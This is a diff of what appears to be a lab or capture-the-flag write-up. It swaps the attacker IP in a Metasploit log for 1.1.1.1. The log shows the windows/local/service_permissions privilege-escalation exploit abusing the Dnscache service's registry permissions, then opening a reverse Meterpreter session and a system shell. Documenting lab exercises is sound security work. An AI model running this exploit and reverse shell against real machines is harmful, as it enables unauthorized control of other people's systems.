@@ -78,12 +78,12 @@ msf6 exploit(windows/local/service_permissions) > set lhost tun0
 lhost => tun0
 msf6 exploit(windows/local/service_permissions) > run
 
-[*] Started reverse TCP handler on 10.10.14.5:4444
+[*] Started reverse TCP handler on 1.1.1.1:4444
 [*] Trying to add a new service...
 [*] Trying to find weak permissions in existing services..
 [+] [Dnscache] Created registry key: HKLM\System\CurrentControlSet\Services\Dnscache\Performance
 [*] Sending stage (175174 bytes) to 10.10.10.5
-[*] Meterpreter session 4 opened (10.10.14.5:4444 -> 10.10.10.5:49271 ) at 2022-01-19 02:02:05 +0000
+[*] Meterpreter session 4 opened (1.1.1.1:4444 -> 10.10.10.5:49271 ) at 2022-01-19 02:02:05 +0000
 
 meterpreter > shell
 Process 728 created.
